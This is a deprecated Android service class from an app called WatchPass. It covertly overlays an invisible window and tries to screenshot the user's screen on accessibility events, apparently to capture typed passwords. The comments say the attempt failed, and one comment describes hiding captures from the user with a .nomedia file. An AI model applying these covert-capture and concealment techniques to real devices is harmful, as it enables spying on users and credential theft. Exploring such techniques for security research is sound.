package com.stevenbenack.watchpass;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;
import android.view.Display;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;

/**
 * This class is deprecated
 * This was my first attempt at capturing the screen where I drew a floating invisible window over everything and took
 * screenshots from that (because Android, I can only take screenshots of my own app and not outside apps for obvious
 * reasons). Unfortunately, Android is smart enough to not let me take screenshots from this invisibile floaing window.
 * I spent a lot of time trying this before moving on to VirtualScreenCaptureService
 */
public class DrawScreenService extends Service {
    private static final String TAG = "DrawScreenService";

    private WindowManager windowManager;
    private View floatingDrawnLayout;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /* On the creation of the service, we inflate the invisible screen on top of everything. This screen is invisible
     * and sits on top of everything the user does. Unfortunately, when we try to take a screenshot of this screen,
     * the screenshot is all black. Android knows to protect against what I'm trying to do
     */
    @Override
    public void onCreate() {
        super.onCreate();

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        Display display = windowManager.getDefaultDisplay();
        Point size = new Point();
        display.getSize(size);

        LayoutInflater inflater = LayoutInflater.from(this);
        floatingDrawnLayout = inflater.inflate(R.layout.activity_draw_over_screen, null);

        final WindowManager.LayoutParams parameters;
        if ( Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ) {
            parameters = new WindowManager.LayoutParams(
//                    WindowManager.LayoutParams.WRAP_CONTENT,
//                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);
        } else {
            parameters = new WindowManager.LayoutParams(
//                    WindowManager.LayoutParams.WRAP_CONTENT,
//                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);
        }

        windowManager.addView(floatingDrawnLayout, parameters);

        if( floatingDrawnLayout != null ) {
            EventBus.getDefault().register(this);
        }

        takeScreenshot();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if( EventBus.getDefault().isRegistered(this) ) {
            EventBus.getDefault().unregister(this);
        }

        if ( floatingDrawnLayout != null ) {
            windowManager.removeView(floatingDrawnLayout);
        }
    }

    /*
     * Event listener to listen for when the user starts typing. Event notification comes from AccessibilityService.
     * On notification of the user clicking on something, take a screenshot
     */
    @Subscribe(threadMode = ThreadMode.BACKGROUND)
    public void onMessageEvent(UserEvents.UserAccessibilityEvent event) {
        /* Do something */
        Log.d(TAG, "ACCESSIBILITY EVENT HERE");
        takeScreenshot();
    }

    /*
     * Method takes a screenshot of the current screen (in this case, an invisible screen drawn over whatever the user
     * is currently doing. The method then saves the screenshot to the device.
     * If this were actually malware, you could set the app to save the photo to a hidden folder on their device
     * such that the user would not be able to see that this app is even saving anything. This would be done by adding
     * a "./nomedia" file to the create folder. I did not do that in this app while I was working for obvious reasons
     */
    private void takeScreenshot() {
        View v = floatingDrawnLayout.getRootView();

        v.setDrawingCacheEnabled(true);
        Bitmap b = v.getDrawingCache();
        File directory = new File(Environment.getExternalStorageDirectory() + "/Download/WatchPass/");
        if ( !directory.exists() || !directory.isDirectory() ) {
            directory.mkdirs();
        }

        File myPath = new File(directory, getString(R.string.screenshot_name) + ".jpg");
        Log.d(TAG, "photo path: " + myPath);
        FileOutputStream fos = null;

        try {
            fos = new FileOutputStream(myPath);
            b.compress(Bitmap.CompressFormat.JPEG, 100, fos);
            fos.flush();
            fos.close();
            MediaStore.Images.Media.insertImage(getContentResolver(), b, "Screen", "screen");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
